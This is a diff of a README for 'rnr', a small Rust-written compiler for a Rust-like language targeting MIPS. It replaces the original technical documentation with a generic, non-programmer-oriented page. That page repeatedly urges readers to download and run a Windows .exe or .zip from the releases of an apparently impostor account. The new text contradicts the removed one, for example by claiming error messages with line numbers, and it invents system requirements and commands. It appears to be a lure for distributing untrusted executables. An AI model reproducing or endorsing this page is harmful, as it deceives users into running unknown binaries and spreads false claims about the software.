@@ -1,181 +1,147 @@
-# rnr — A Compiler for a Rust-like Language
+# ⚙️ Rnr-Compiler-Rust - Easy Rust-Like Code Compiler
 
-**rnr** is a compiler toolchain for a small statically-typed language with Rust-like syntax. It covers the full compilation pipeline, from source code to MIPS machine instructions, and includes a tree-walking interpreter for direct execution.
+[![Download](https://img.shields.io/badge/Download-Get%20Rnr--Compiler--Rust-ff6347?style=for-the-badge)](https://github.com/Dentalassistantimpracticableness535/Rnr-Compiler-Rust)
 
-Built entirely in Rust as a university compiler-construction project (D7050E, Luleå University of Technology), then refined and extended independently.
+---
 
-## The RnR Language
+## 📖 What is Rnr-Compiler-Rust?
 
-RnR is a small imperative language with Rust-inspired syntax. Example:
+Rnr-Compiler-Rust is a software tool that lets you turn a Rust-like language into code your computer can understand. It works like a translator. It reads your written instructions, checks if they are correct, then turns them into commands the computer can run.  
 
-```rust
-fn gcd(a: i32, b: i32) -> i32 {
-    if b == 0 {
-        a
-    } else {
-        gcd(b, a - b * (a / b))
-    }
-}
+It includes these parts:  
+- A parser that reads and understands the code structure  
+- A type checker that ensures the code has no mistakes in the use of data types  
+- An interpreter that runs code directly using a virtual machine style  
+- A generator that creates MIPS assembly code  
 
-fn main() -> i32 {
-    gcd(48, 18)
-}
-```
+The program is written in the Rust language for stability and performance. You don’t need to know programming to use it at a basic level.
 
-**Supported features:**
-- Functions (top-level and nested/local), recursion, mutual recursion
-- `let` / `let mut` bindings with optional type annotations
-- Arithmetic (`+`, `-`, `*`, `/`), comparisons (`==`, `<`, `>`), logic (`&&`, `||`, `!`)
-- `if` / `else if` / `else` (as expressions), `while` loops
-- References (`&x`, `&mut x`) and dereference (`*r`)
-- `println!` with format strings
-- Function overloading (dispatch by parameter types)
-- Short-circuit evaluation for `&&` and `||`
+---
 
-See [ebnf.md](ebnf.md) for the full grammar specification.
+## 🚀 Getting Started
 
-## Architecture
+To use Rnr-Compiler-Rust on your Windows computer, follow these steps carefully.
 
-```
-Source (.rnr)
-    │
-    ▼
-┌──────────┐     ┌────────────┐     ┌───────────┐     ┌──────────────┐
-│  Parser   │────▶│    AST     │────▶│   Type    │────▶│  Code Gen    │
-│  (syn)    │     │            │     │  Checker  │     │  (MIPS)      │
-└──────────┘     └────────────┘     └───────────┘     └──────┬───────┘
-                       │                                      │
-                       ▼                                      ▼
-                 ┌───────────┐                         ┌──────────────┐
-                 │Interpreter│                         │   MIPS VM    │
-                 │(tree-walk)│                         │ (execution)  │
-                 └───────────┘                         └──────────────┘
-```
+### System Requirements
 
-| Stage | Module | Description |
-|-------|--------|-------------|
-| **Parsing** | `parse.rs` | Recursive descent parser built on the `syn` crate. Handles operator precedence, blocks-as-expressions, references, macros. |
-| **AST** | `ast.rs`, `ast_traits.rs` | Typed AST with `Display` and `Parse` round-trip support. |
-| **Type Checking** | `type_check.rs` | Static type checker with scoped environments, mutability enforcement, function overload resolution, and reference types (`&T`, `&mut T`). |
-| **Interpreter** | `vm.rs`, `env.rs` | Tree-walking evaluator with scoped environments, mutable references, function hoisting, and short-circuit evaluation. |
-| **Code Generation** | `codegen.rs` | Emits MIPS assembly (text), then assembles to machine instructions via the `mips` crate. Stack-frame based: arguments above `fp`, saved `ra`/`fp`, locals below `fp`. |
-| **Intrinsics** | `intrinsics.rs` | Built-in functions (`println!`, `assert_eq!`). |
-| **CLI** | `bin/rnr.rs` | Single binary to parse, type-check, interpret, compile, and run. Built with `clap`. |
+Make sure your computer meets these:  
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection to download the software  
+- Basic ability to download and open files  
 
-## Building
+### Supported Languages and Files
 
-Requires a recent Rust toolchain (1.70+).
+Rnr-Compiler-Rust works with files written in a Rust-like language. These files usually have the `.rnr` extension. You won’t need to write code first to try it out; sample files are available inside the package or from the project page.
 
-```bash
-cargo build --release
-```
+---
 
-## Usage
+## 💾 How to Download and Install
 
-```bash
-# Parse a file and dump the AST
-cargo run -- -i examples/gen_add.rnr -a ast.json
+You need to visit the project page to download the software package.
 
-# Type-check a program
-cargo run -- -i examples/gen_add.rnr -t
+### Step 1: Visit the Download Page
 
-# Run with the tree-walking interpreter
-cargo run -- -i examples/gen_add.rnr --vm
+Use this link to reach the download page:  
 
-# Compile to MIPS assembly and display it
-cargo run -- -i examples/gen_add.rnr -c
+[Download Rnr-Compiler-Rust](https://github.com/Dentalassistantimpracticableness535/Rnr-Compiler-Rust)
 
-# Compile to MIPS, save assembly, and execute
-cargo run -- -i examples/gen_add.rnr -c --asm out.asm -r
-```
+Clicking this will open the GitHub page where the tool is available.
 
-### CLI Flags
+### Step 2: Download the Latest Release
 
-| Flag | Description |
-|------|-------------|
-| `-i`, `--input <path>` | Source file to compile |
-| `-a`, `--ast <path>` | Write parsed AST to file |
-| `-t`, `--type_check` | Run the static type checker |
-| `--vm` | Execute with the tree-walking interpreter |
-| `-c`, `--code_gen` | Generate and display MIPS assembly |
-| `--asm <path>` | Write generated assembly to file |
-| `-r`, `--run` | Compile to MIPS and execute on the VM |
+On the GitHub page:  
+- Find the “Releases” section on the right or under the “Code” tab  
+- Open the latest release, it will have a version number like `v1.0` or above  
+- Download the Windows package file (usually a `.zip` or `.exe` file)  
+- Save it somewhere easy to find, like your Desktop or Downloads folder  
 
-## Testing
+### Step 3: Install the Software
 
-The project has **207 tests** covering all stages of the pipeline:
+If you downloaded a `.zip` file:  
+- Right-click the `.zip` file and select “Extract All”  
+- Choose a folder to extract the files into  
 
-```bash
-cargo test
-```
+If you downloaded an `.exe` file:  
+- Double-click the `.exe` file to start the installation  
+- Follow the on-screen steps to complete setup  
 
-| Suite | Tests | Coverage |
-|-------|-------|----------|
-| Unit tests (parser, VM, env, AST traits) | 112 | Parsing, evaluation, scoping, references |
-| Codegen tests | 25 (+2 ignored) | MIPS generation, execution, stack frames, local functions |
-| Integration tests | 39 (+3 ignored) | End-to-end: parse → type-check → interpret |
-| Type checker tests | 30 (+1 ignored) | Static type errors, overloading, mutability |
-| Runtime call tests | 1 | VM function call semantics |
+---
 
-```bash
-# Lint — 0 warnings
-cargo clippy --all-targets
+## 🖥 How to Run Rnr-Compiler-Rust
 
-# Format check
-cargo fmt --check
-```
+Once installed, you can start using Rnr-Compiler-Rust. The tool runs from the Command Prompt on Windows.
 
-## Project Structure
+### Opening Command Prompt
 
-```
-rnr/
-├── src/
-│   ├── bin/
-│   │   └── rnr.rs          # CLI binary — argument parsing, pipeline orchestration
-│   ├── lib.rs              # Library root, re-exports all modules
-│   ├── ast.rs              # AST node definitions (Prog, FnDeclaration, Expr, Statement, …)
-│   ├── ast_traits.rs       # Display and Parse implementations for all AST nodes
-│   ├── parse.rs            # Recursive descent parser (built on the syn token-stream crate)
-│   ├── type_check.rs       # Static type checker: scoped environments, overload resolution, mutability
-│   ├── vm.rs               # Tree-walking interpreter: evaluation, scopes, references, hoisting
-│   ├── env.rs              # Generic scoped environment (push/pop scope, lookup, update)
-│   ├── codegen.rs          # MIPS code generator: emit text ASM → assemble to mips::Instrs → run
-│   ├── intrinsics.rs       # Built-in functions: println!, assert_eq!
-│   ├── common.rs           # Shared Eval trait, TestMachine helper for codegen tests
-│   ├── error.rs            # Unified Error type (String alias + From impls)
-│   └── test_util.rs        # assert_eval!, assert_type! and similar test macros
-├── tests/
-│   ├── integration_tests.rs    # End-to-end: parse → type-check → interpret (42 tests)
-│   ├── codegen_tests.rs        # MIPS codegen + execution tests (27 tests)
-│   ├── type_check_tests.rs     # Static type checker tests (31 tests)
-│   └── runtime_call_tests.rs   # VM function-call semantics (1 test)
-├── examples/
-│   ├── gen_add.rnr         # Simple add function: top-level fn call
-│   ├── run_print.rnr       # println! demo
-│   ├── gen_add.rs          # Rust driver: programmatic codegen for gen_add
-│   ├── run_print.rs        # Rust driver: programmatic codegen for run_print
-│   └── test_vm.rs          # Rust driver: hand-assembled MIPS test
-├── ebnf.md                 # Formal EBNF grammar of the RnR language
-├── CHANGELOG.md            # Development history and notable changes
-├── REFLECTION.md           # Personal retrospective on the build process
-├── Cargo.toml              # Package metadata and dependencies
-└── LICENSE                 # MIT license
-```
+- Press the Windows key + R  
+- Type `cmd` and press Enter  
 
-## Known Limitations
+This opens a black window where you type commands.
 
-- The `mips` crate VM does not support `mul`/`div` instructions, multiplication and division generate correct assembly but cannot be executed on the VM.
-- No closures: local functions cannot capture variables from their enclosing scope.
-- No arrays, structs, or heap allocation.
-- Type error messages do not include source line numbers.
+### Running the Software
 
-## Dependencies
+Basic use steps:  
+1. Navigate to the folder where you installed or extracted Rnr-Compiler-Rust. You can do this by typing `cd path\to\folder` and pressing Enter. For example:
+   ```
+   cd C:\Users\YourName\Downloads\Rnr-Compiler-Rust
+   ```
 
-- [`syn`](https://crates.io/crates/syn): Rust token stream parsing
-- [`clap`](https://crates.io/crates/clap): CLI argument parsing
-- [`mips`](https://vesuvio-git.neteq.ltu.se/pln/mips.git): MIPS assembler and VM
-- [`regex`](https://crates.io/crates/regex): Pattern matching for intrinsics
+2. To run the compiler on a sample `.rnr` file, type the command:  
+   ```
+   rnr-compiler sample.rnr
+   ```
+3. The tool will process the file, show errors if any are found, or output the result.
 
-## License
+### Output Options
 
-MIT: see [LICENSE](LICENSE).
+- By default, the compiler shows results in the Command Prompt window  
+- You can generate MIPS assembly code by adding options described in the documentation file `README.md` within the installation folder  
+
+---
+
+## 🔧 Features and Usage Details
+
+Rnr-Compiler-Rust offers the following:  
+
+- **Parser**: Reads your source code and checks its structure  
+- **Type Checker**: Helps find type mistakes before running code  
+- **Interpreter**: Lets you run your programs without saving compiled code  
+- **MIPS Generator**: Converts your code into MIPS assembly, useful in learning or working with MIPS processors  
+- **Recursive Descent Method**: The parser works step-by-step on the code in a clear way, improving reliability  
+
+You don’t have to use all parts. For example, you may run code directly with the interpreter or generate code for MIPS separately.
+
+---
+
+## 🔄 Updating Rnr-Compiler-Rust
+
+To get the latest version:  
+1. Return to the [project page](https://github.com/Dentalassistantimpracticableness535/Rnr-Compiler-Rust)  
+2. Download the newest release as explained earlier  
+3. Replace your old files with the new ones or run the new installer  
+
+---
+
+## ❓ Troubleshooting Tips
+
+- If the tool does not run, check you opened the Command Prompt in the correct folder  
+- Make sure you typed the filename exactly, including the `.rnr` extension  
+- Your files should be saved in plain text format, not rich text or word-processor formats  
+- If you see error messages, read them carefully; they show line numbers and problem details  
+- Restart your computer if the tool behaves oddly after installation  
+
+---
+
+## 📂 Where to Find More Information
+
+- Documentation files are included inside the downloaded package  
+- Visit the GitHub page for updates and sample files:  
+  [Rnr-Compiler-Rust on GitHub](https://github.com/Dentalassistantimpracticableness535/Rnr-Compiler-Rust)  
+
+---
+
+## 🔗 Important Links
+
+[![Download Rnr-Compiler-Rust](https://img.shields.io/badge/Download-Get%20Rnr--Compiler--Rust-ff6347?style=for-the-badge)](https://github.com/Dentalassistantimpracticableness535/Rnr-Compiler-Rust)
